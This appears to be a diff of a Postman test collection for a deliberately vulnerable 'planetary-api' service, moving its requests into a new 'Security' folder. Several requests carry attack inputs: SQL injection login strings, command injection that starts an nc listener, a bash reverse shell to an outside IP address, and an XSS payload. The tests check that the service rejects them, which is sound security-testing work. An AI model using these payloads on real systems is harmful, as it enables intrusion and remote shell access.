@@ -1,726 +1,711 @@
 {
-	"info": {
-		"_postman_id": "6d4ff55b-44f9-49af-a9e8-e5fc01367633",
-		"name": "planetary-api",
-		"description": "Planetary API is deliberately vulnerable code for test purposes",
-		"schema": "https://schema.getpostman.com/json/collection/v2.0.0/collection.json",
-		"_exporter_id": "19909390"
-	},
-	"item": [
-		{
-			"name": "Basic",
-			"item": [
-				{
-					"name": "Insecure Login",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"var jsonData = pm.response.json();",
-									"pm.environment.set(\"access_token\", jsonData.access_token);",
-									"",
-									"pm.test(\"Status code is 401 - SQL Injection\", function () {",
-									"    pm.response.to.have.status(401);",
-									"});",
-									"",
-									"pm.test(\"Bad email or password - SQLi\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
-									"});"
-								],
-								"type": "text/javascript",
-								"packages": {}
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "noauth"
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\n    \"email\": \"test@test.com\",\n    \"password\": \"' or 1=1;#\"\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": "http://{{host}}:{{port}}/login"
-					},
-					"response": []
-				},
-				{
-					"name": "Insecure Login 2",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"var jsonData = pm.response.json();",
-									"pm.environment.set(\"access_token\", jsonData.access_token);",
-									"",
-									"pm.test(\"Status code is 401 - SQL Injection\", function () {",
-									"    pm.response.to.have.status(401);",
-									"});",
-									"",
-									"pm.test(\"Bad email or password - SQLi\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
-									"});"
-								],
-								"type": "text/javascript",
-								"packages": {}
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "noauth"
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\n    \"email\": \"' or 1=1;#\",\n    \"password\": \"\"\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": "http://{{host}}:{{port}}/login"
-					},
-					"response": []
-				},
-				{
-					"name": "Login",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"var jsonData = pm.response.json();",
-									"pm.environment.set(\"access_token\", jsonData.access_token);",
-									"",
-									"pm.test(\"Status code is 200\", function () {",
-									"    pm.response.to.have.status(200);",
-									"});",
-									"",
-									"pm.test(\"Login succeeded!\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData.message).to.eql(\"Login succeeded!\");",
-									"});"
-								],
-								"type": "text/javascript",
-								"packages": {}
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "noauth"
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\n    \"email\": \"test@test.com\",\n    \"password\": \"P@ssw0rd\"\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": "http://{{host}}:{{port}}/login"
-					},
-					"response": []
-				},
-				{
-					"name": "Add Planet",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"var jsonData = pm.response.json();",
-									"pm.environment.set(\"id\", jsonData.id);"
-								],
-								"type": "text/javascript",
-								"packages": {}
-							}
-						},
-						{
-							"listen": "prerequest",
-							"script": {
-								"exec": [
-									""
-								],
-								"type": "text/javascript",
-								"packages": {}
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "bearer",
-							"bearer": {
-								"token": "{{access_token}}"
-							}
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "formdata",
-							"formdata": [
-								{
-									"key": "planet_type",
-									"value": "Class S",
-									"type": "text"
-								},
-								{
-									"key": "planet_name",
-									"value": "{{$randomFirstName}}",
-									"type": "text"
-								},
-								{
-									"key": "radius",
-									"value": "242325212434",
-									"type": "text"
-								},
-								{
-									"key": "mass",
-									"value": "23423423454e34",
-									"type": "text"
-								},
-								{
-									"key": "distance",
-									"value": "2343134e23",
-									"type": "text"
-								},
-								{
-									"key": "home_star",
-									"value": "Sol",
-									"type": "text"
-								}
-							]
-						},
-						"url": "http://{{host}}:{{port}}/add_planet"
-					},
-					"response": []
-				},
-				{
-					"name": "Add Planet JSON",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"var jsonData = pm.response.json();",
-									"pm.environment.set(\"id\", jsonData.id);",
-									"",
-									""
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "bearer",
-							"bearer": {
-								"token": "{{access_token}}"
-							}
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\n    \"planet_name\":\"{{$randomFirstName}}\",\n    \"planet_type\":\"Class D\",\n    \"home_star\":\"Sol\",\n    \"mass\":\"2.258e23\",\n    \"radius\":\"1516\",\n    \"distance\":\"35.98e6\"\n}\n",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": "http://{{host}}:{{port}}/add_planet"
-					},
-					"response": []
-				},
-				{
-					"name": "Get Planet Details",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"var jsonData = pm.response.json();",
-									"pm.environment.set(\"planet_name\", jsonData.planet_name);"
-								],
-								"type": "text/javascript"
-							}
-						},
-						{
-							"listen": "prerequest",
-							"script": {
-								"exec": [
-									""
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": "http://{{host}}:{{port}}/planet_details/{{id}}"
-					},
-					"response": []
-				},
-				{
-					"name": "Update Planet",
-					"request": {
-						"auth": {
-							"type": "bearer",
-							"bearer": {
-								"token": "{{access_token}}"
-							}
-						},
-						"method": "PUT",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\n    \"planet_id\": {{id}},\n    \"planet_name\": \"Mercury\",\n    \"planet_type\": \"Class A\",\n    \"home_star\": \"Sol\",\n    \"mass\": 2.258e23,\n    \"radius\": 1516,\n    \"distance\": 35.98e6\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": "http://{{host}}:{{port}}/update_planet"
-					},
-					"response": []
-				},
-				{
-					"name": "Planets",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"pm.test(\"Status code is 200\", function () {",
-									"    pm.response.to.have.status(200);",
-									"});",
-									"",
-									"pm.test(\"Mercury Planet\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData[0].planet_name).to.eql(\"Mercury\");",
-									"});"
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": "http://{{host}}:{{port}}/planets"
-					},
-					"response": []
-				},
-				{
-					"name": "dbsize",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"pm.test(\"Status code is 200\", function () {",
-									"    pm.response.to.have.status(200);",
-									"});",
-									""
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": "http://{{host}}:{{port}}/dbsize/planets.db"
-					},
-					"response": []
-				},
-				{
-					"name": "Delete Planet",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"pm.test(\"Planet Deleted Success\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData.message).to.eql(\"You deleted a planet\");",
-									"});"
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "bearer",
-							"bearer": {
-								"token": "{{access_token}}"
-							}
-						},
-						"method": "DELETE",
-						"header": [],
-						"url": "http://{{host}}:{{port}}/remove_planet/{{id}}"
-					},
-					"response": []
-				},
-				{
-					"name": "Forgot Password",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"pm.test(\"Status code is 200\", function () {",
-									"    pm.response.to.have.status(200);",
-									"});",
-									""
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": "http://{{host}}:{{port}}/retrieve_password/{{email}}"
-					},
-					"response": []
-				}
-			],
-			"event": [
-				{
-					"listen": "prerequest",
-					"script": {
-						"type": "text/javascript",
-						"exec": [
-							""
-						]
-					}
-				},
-				{
-					"listen": "test",
-					"script": {
-						"type": "text/javascript",
-						"exec": [
-							""
-						]
-					}
-				}
-			]
-		},
-		{
-			"name": "Negative",
-			"item": [
-				{
-					"name": "Add Planet Missing Name",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"pm.test(\"Status code is 400\", function () {",
-									"    pm.response.to.have.status(400);",
-									"});",
-									"",
-									"pm.test(\"Missing Planet Name\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData.message).to.eql(\"missing planet name\");",
-									"});"
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "bearer",
-							"bearer": {
-								"token": "{{access_token}}"
-							}
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "formdata",
-							"formdata": [
-								{
-									"key": "planet_type",
-									"value": "12",
-									"type": "text"
-								},
-								{
-									"key": "planet_name",
-									"value": "",
-									"type": "text"
-								},
-								{
-									"key": "radius",
-									"value": "242325212434",
-									"type": "text"
-								},
-								{
-									"key": "mass",
-									"value": "23423423454e34",
-									"type": "text"
-								},
-								{
-									"key": "distance",
-									"value": "2343134e23",
-									"type": "text"
-								},
-								{
-									"key": "home_star",
-									"value": "Sol",
-									"type": "text"
-								}
-							]
-						},
-						"url": "http://{{host}}:{{port}}/add_planet"
-					},
-					"response": []
-				},
-				{
-					"name": "Add Planet Planet Name Exists",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"pm.test(\"Status code is 409\", function () {",
-									"    pm.response.to.have.status(409);",
-									"});",
-									"pm.test(\"Planet Already Exists\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData.message).to.eql(\"There is already a planet by that name\");",
-									"});"
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "bearer",
-							"bearer": {
-								"token": "{{access_token}}"
-							}
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\n    \"planet_name\":\"Mercury\",\n    \"planet_type\":\"Class D\",\n    \"home_star\":\"Sol\",\n    \"mass\":\"2.258e23\",\n    \"radius\":\"1516\",\n    \"distance\":\"35.98e6\"\n}\n",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": "http://{{host}}:{{port}}/add_planet"
-					},
-					"response": []
-				},
-				{
-					"name": "Login Failure Incorrect Password",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"var jsonData = pm.response.json();",
-									"pm.environment.set(\"access_token\", jsonData.access_token);",
-									"",
-									"pm.test(\"Status code is 401\", function () {",
-									"    pm.response.to.have.status(401);",
-									"});",
-									"",
-									"pm.test(\"Login failed incorrect email or password\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
-									"});"
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "noauth"
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\n    \"email\": \"test@test.com\",\n    \"password\": \"wrongpass\"\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": "http://{{host}}:{{port}}/login"
-					},
-					"response": []
-				},
-				{
-					"name": "Login Failure Incorrect Username",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"var jsonData = pm.response.json();",
-									"pm.environment.set(\"access_token\", jsonData.access_token);",
-									"",
-									"pm.test(\"Status code is 401\", function () {",
-									"    pm.response.to.have.status(401);",
-									"});",
-									"",
-									"pm.test(\"Login failed incorrect email or password\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
-									"});"
-								],
-								"type": "text/javascript"
-							}
-						}
-					],
-					"request": {
-						"auth": {
-							"type": "noauth"
-						},
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\n    \"email\": \"{{$randomFirstName}}@test.com\",\n    \"password\": \"P@ssw0rd\"\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": "http://{{host}}:{{port}}/login"
-					},
-					"response": []
-				},
-				{
-					"name": "dbsize cmd injection",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"pm.test(\"Status code is 400 - CMD Injection\", function () {",
-									"    pm.response.to.have.status(400);",
-									"});",
-									"",
-									""
-								],
-								"type": "text/javascript",
-								"packages": {}
-							}
-						}
-					],
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": "http://{{host}}:{{port}}/dbsize/planets.db;nc -lnv -p 4444"
-					},
-					"response": []
-				},
-				{
-					"name": "dbsize cmd injection Bind Shell",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"pm.test(\"Status code is 400 - CMD Injection\", function () {",
-									"    pm.response.to.have.status(400);",
-									"});",
-									"",
-									""
-								],
-								"type": "text/javascript",
-								"packages": {}
-							}
-						}
-					],
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": "http://{{host}}:{{port}}/dbsize/planets.db;/bin/bash -i >& /dev/tcp/80.235.215.60/4444 0>&1"
-					},
-					"response": []
-				},
-				{
-					"name": "dbsize XSS",
-					"event": [
-						{
-							"listen": "test",
-							"script": {
-								"exec": [
-									"pm.test(\"Status code is 200\", function () {",
-									"    pm.response.to.have.status(200);",
-									"});",
-									""
-								],
-								"type": "text/javascript",
-								"packages": {}
-							}
-						}
-					],
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": "http://{{host}}:{{port}}/dbsize/planets.db;echo '<BODY ONLOAD=alert(\"xss\")>'"
-					},
-					"response": []
-				}
-			]
-		}
-	],
-	"event": [
-		{
-			"listen": "prerequest",
-			"script": {
-				"type": "text/javascript",
-				"exec": [
-					""
-				]
-			}
-		},
-		{
-			"listen": "test",
-			"script": {
-				"type": "text/javascript",
-				"exec": [
-					"pm.test(\"Response time is less than 2000ms\", function () {",
-					"    pm.expect(pm.response.responseTime).to.be.below(2000);",
-					"});"
-				]
-			}
-		}
-	]
+  "info": {
+    "_postman_id": "6d4ff55b-44f9-49af-a9e8-e5fc01367633",
+    "name": "planetary-api",
+    "description": "Planetary API is deliberately vulnerable code for test purposes",
+    "schema": "https://schema.getpostman.com/json/collection/v2.0.0/collection.json",
+    "_exporter_id": "19909390"
+  },
+  "item": [
+    {
+      "name": "Security",
+      "item": [
+        {
+          "name": "Insecure Login",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "pm.environment.set(\"access_token\", jsonData.access_token);",
+                  "",
+                  "pm.test(\"Status code is 401 - SQL Injection\", function () {",
+                  "    pm.response.to.have.status(401);",
+                  "});",
+                  "",
+                  "pm.test(\"Bad email or password - SQLi\", function () {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
+                  "});"
+                ],
+                "type": "text/javascript",
+                "packages": {}
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"email\": \"test@test.com\",\n    \"password\": \"' or 1=1;#\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": "http://{{host}}:{{port}}/login"
+          },
+          "response": []
+        },
+        {
+          "name": "Insecure Login 2",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "pm.environment.set(\"access_token\", jsonData.access_token);",
+                  "",
+                  "pm.test(\"Status code is 401 - SQL Injection\", function () {",
+                  "    pm.response.to.have.status(401);",
+                  "});",
+                  "",
+                  "pm.test(\"Bad email or password - SQLi\", function () {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
+                  "});"
+                ],
+                "type": "text/javascript",
+                "packages": {}
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"email\": \"' or 1=1;#\",\n    \"password\": \"\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": "http://{{host}}:{{port}}/login"
+          },
+          "response": []
+        },
+        {
+          "name": "dbsize",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test(\"Status code is 200\", function () {",
+                  "    pm.response.to.have.status(200);",
+                  "});",
+                  ""
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "http://{{host}}:{{port}}/dbsize/planets.db"
+          },
+          "response": []
+        },
+        {
+          "name": "dbsize cmd injection",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test(\"Status code is 400 - CMD Injection\", function () {",
+                  "    pm.response.to.have.status(400);",
+                  "});",
+                  "",
+                  ""
+                ],
+                "type": "text/javascript",
+                "packages": {}
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "http://{{host}}:{{port}}/dbsize/planets.db;nc -lnv -p 4444"
+          },
+          "response": []
+        },
+        {
+          "name": "dbsize cmd injection Bind Shell",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test(\"Status code is 400 - CMD Injection\", function () {",
+                  "    pm.response.to.have.status(400);",
+                  "});",
+                  "",
+                  ""
+                ],
+                "type": "text/javascript",
+                "packages": {}
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "http://{{host}}:{{port}}/dbsize/planets.db;/bin/bash -i >& /dev/tcp/80.235.215.60/4444 0>&1"
+          },
+          "response": []
+        },
+        {
+          "name": "dbsize XSS",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test(\"Status code is 200\", function () {",
+                  "    pm.response.to.have.status(200);",
+                  "});",
+                  ""
+                ],
+                "type": "text/javascript",
+                "packages": {}
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "http://{{host}}:{{port}}/dbsize/planets.db;echo '<BODY ONLOAD=alert(\"xss\")>'"
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Basic",
+      "item": [
+        {
+          "name": "Login",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "pm.environment.set(\"access_token\", jsonData.access_token);",
+                  "",
+                  "pm.test(\"Status code is 200\", function () {",
+                  "    pm.response.to.have.status(200);",
+                  "});",
+                  "",
+                  "pm.test(\"Login succeeded!\", function () {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.expect(jsonData.message).to.eql(\"Login succeeded!\");",
+                  "});"
+                ],
+                "type": "text/javascript",
+                "packages": {}
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"email\": \"test@test.com\",\n    \"password\": \"P@ssw0rd\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": "http://{{host}}:{{port}}/login"
+          },
+          "response": []
+        },
+        {
+          "name": "Add Planet",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "pm.environment.set(\"id\", jsonData.id);"
+                ],
+                "type": "text/javascript",
+                "packages": {}
+              }
+            },
+            {
+              "listen": "prerequest",
+              "script": {
+                "exec": [
+                  ""
+                ],
+                "type": "text/javascript",
+                "packages": {}
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": {
+                "token": "{{access_token}}"
+              }
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "planet_type",
+                  "value": "Class S",
+                  "type": "text"
+                },
+                {
+                  "key": "planet_name",
+                  "value": "{{$randomFirstName}}",
+                  "type": "text"
+                },
+                {
+                  "key": "radius",
+                  "value": "242325212434",
+                  "type": "text"
+                },
+                {
+                  "key": "mass",
+                  "value": "23423423454e34",
+                  "type": "text"
+                },
+                {
+                  "key": "distance",
+                  "value": "2343134e23",
+                  "type": "text"
+                },
+                {
+                  "key": "home_star",
+                  "value": "Sol",
+                  "type": "text"
+                }
+              ]
+            },
+            "url": "http://{{host}}:{{port}}/add_planet"
+          },
+          "response": []
+        },
+        {
+          "name": "Add Planet JSON",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "pm.environment.set(\"id\", jsonData.id);",
+                  "",
+                  ""
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": {
+                "token": "{{access_token}}"
+              }
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"planet_name\":\"{{$randomFirstName}}\",\n    \"planet_type\":\"Class D\",\n    \"home_star\":\"Sol\",\n    \"mass\":\"2.258e23\",\n    \"radius\":\"1516\",\n    \"distance\":\"35.98e6\"\n}\n",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": "http://{{host}}:{{port}}/add_planet"
+          },
+          "response": []
+        },
+        {
+          "name": "Get Planet Details",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "pm.environment.set(\"planet_name\", jsonData.planet_name);"
+                ],
+                "type": "text/javascript"
+              }
+            },
+            {
+              "listen": "prerequest",
+              "script": {
+                "exec": [
+                  ""
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "http://{{host}}:{{port}}/planet_details/{{id}}"
+          },
+          "response": []
+        },
+        {
+          "name": "Update Planet",
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": {
+                "token": "{{access_token}}"
+              }
+            },
+            "method": "PUT",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"planet_id\": {{id}},\n    \"planet_name\": \"Mercury\",\n    \"planet_type\": \"Class A\",\n    \"home_star\": \"Sol\",\n    \"mass\": 2.258e23,\n    \"radius\": 1516,\n    \"distance\": 35.98e6\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": "http://{{host}}:{{port}}/update_planet"
+          },
+          "response": []
+        },
+        {
+          "name": "Planets",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test(\"Status code is 200\", function () {",
+                  "    pm.response.to.have.status(200);",
+                  "});",
+                  "",
+                  "pm.test(\"Mercury Planet\", function () {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.expect(jsonData[0].planet_name).to.eql(\"Mercury\");",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "http://{{host}}:{{port}}/planets"
+          },
+          "response": []
+        },
+        {
+          "name": "Delete Planet",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test(\"Planet Deleted Success\", function () {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.expect(jsonData.message).to.eql(\"You deleted a planet\");",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": {
+                "token": "{{access_token}}"
+              }
+            },
+            "method": "DELETE",
+            "header": [],
+            "url": "http://{{host}}:{{port}}/remove_planet/{{id}}"
+          },
+          "response": []
+        },
+        {
+          "name": "Forgot Password",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test(\"Status code is 200\", function () {",
+                  "    pm.response.to.have.status(200);",
+                  "});",
+                  ""
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": "http://{{host}}:{{port}}/retrieve_password/{{email}}"
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Negative",
+      "item": [
+        {
+          "name": "Add Planet Missing Name",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test(\"Status code is 400\", function () {",
+                  "    pm.response.to.have.status(400);",
+                  "});",
+                  "",
+                  "pm.test(\"Missing Planet Name\", function () {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.expect(jsonData.message).to.eql(\"missing planet name\");",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": {
+                "token": "{{access_token}}"
+              }
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "planet_type",
+                  "value": "12",
+                  "type": "text"
+                },
+                {
+                  "key": "planet_name",
+                  "value": "",
+                  "type": "text"
+                },
+                {
+                  "key": "radius",
+                  "value": "242325212434",
+                  "type": "text"
+                },
+                {
+                  "key": "mass",
+                  "value": "23423423454e34",
+                  "type": "text"
+                },
+                {
+                  "key": "distance",
+                  "value": "2343134e23",
+                  "type": "text"
+                },
+                {
+                  "key": "home_star",
+                  "value": "Sol",
+                  "type": "text"
+                }
+              ]
+            },
+            "url": "http://{{host}}:{{port}}/add_planet"
+          },
+          "response": []
+        },
+        {
+          "name": "Add Planet Planet Name Exists",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test(\"Status code is 409\", function () {",
+                  "    pm.response.to.have.status(409);",
+                  "});",
+                  "pm.test(\"Planet Already Exists\", function () {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.expect(jsonData.message).to.eql(\"There is already a planet by that name\");",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": {
+                "token": "{{access_token}}"
+              }
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"planet_name\":\"Mercury\",\n    \"planet_type\":\"Class D\",\n    \"home_star\":\"Sol\",\n    \"mass\":\"2.258e23\",\n    \"radius\":\"1516\",\n    \"distance\":\"35.98e6\"\n}\n",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": "http://{{host}}:{{port}}/add_planet"
+          },
+          "response": []
+        },
+        {
+          "name": "Login Failure Incorrect Password",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "pm.environment.set(\"access_token\", jsonData.access_token);",
+                  "",
+                  "pm.test(\"Status code is 401\", function () {",
+                  "    pm.response.to.have.status(401);",
+                  "});",
+                  "",
+                  "pm.test(\"Login failed incorrect email or password\", function () {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"email\": \"test@test.com\",\n    \"password\": \"wrongpass\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": "http://{{host}}:{{port}}/login"
+          },
+          "response": []
+        },
+        {
+          "name": "Login Failure Incorrect Username",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "var jsonData = pm.response.json();",
+                  "pm.environment.set(\"access_token\", jsonData.access_token);",
+                  "",
+                  "pm.test(\"Status code is 401\", function () {",
+                  "    pm.response.to.have.status(401);",
+                  "});",
+                  "",
+                  "pm.test(\"Login failed incorrect email or password\", function () {",
+                  "    var jsonData = pm.response.json();",
+                  "    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "noauth"
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"email\": \"{{$randomFirstName}}@test.com\",\n    \"password\": \"P@ssw0rd\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": "http://{{host}}:{{port}}/login"
+          },
+          "response": []
+        }
+      ]
+    }
+  ],
+  "event": [
+    {
+      "listen": "prerequest",
+      "script": {
+        "type": "text/javascript",
+        "exec": [
+          ""
+        ]
+      }
+    },
+    {
+      "listen": "test",
+      "script": {
+        "type": "text/javascript",
+        "exec": [
+          "pm.test(\"Response time is less than 2000ms\", function () {",
+          "    pm.expect(pm.response.responseTime).to.be.below(2000);",
+          "});"
+        ]
+      }
+    }
+  ]
 }
